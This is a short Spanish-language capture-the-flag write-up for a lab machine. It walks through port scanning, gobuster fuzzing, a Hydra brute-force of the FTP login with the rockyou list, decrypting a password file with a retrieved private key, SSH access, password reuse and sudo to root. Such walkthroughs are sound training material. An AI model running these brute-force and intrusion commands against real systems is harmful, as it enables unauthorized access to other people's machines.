## Reconocimiento:

Puerto 21 : FTP

Puerto 22 : SSH

Puerto 80 : HTTP

Dentro de la web hay un mensaje:

```bash
Welcome mwheeler!!
```

Le aplico fuzzing ya que no revela nada:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt -t 100 -k
```

Encuentro el directorio “strange”.

Estuve un rato probando posibles contraseñas con las palabras de la web y no parece haber nada interesante tampoco, así que le vuelvo a aplicar fuzzing:

```bash
gobuster dir -u http://172.17.0.2/strange -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt -t 100 -k
```

Encuentro dos directorios interesantes: private.txt y secret.html

Private.txt es un archivo encriptado y en secret.html se ve:

```bash
The ftp user is admin, but the password is ...
You must discover it.
A hint: The rockyou diccionary is correct for use!
```

Así que aplico un ataque con Hydra al servicio FTP:

```bash
hydra -l admin -P ../rockyou.txt ftp://172.17.0.2 -t 64 -I
```

Pass : banana

Entro al servicio FTP y me paso el único archivo que hay:

```bash
get private_key.pem
```

Parece una clave de desencriptación. La utilizo en el archivo private.txt con el siguiente comando:

```bash
openssl pkeyutl -decrypt -in private.txt -out decrypted.txt -inkey private_key.pem
```

El output Fué:

```bash
demogorgon
```

Probándola como contraseña en SSH para los posibles usuarios obtengo acceso con mwheeler.

## Escalada mwheeler → admin

Se recicla la contraseña de ftp:

```bash
su admin
# banana
```

## Escalada admin → root

```bash
sudo -l
(ALL) ALL
```

Puedo ejecutar cualquier cosa como root.

```bash
sudo su
```

Listo.
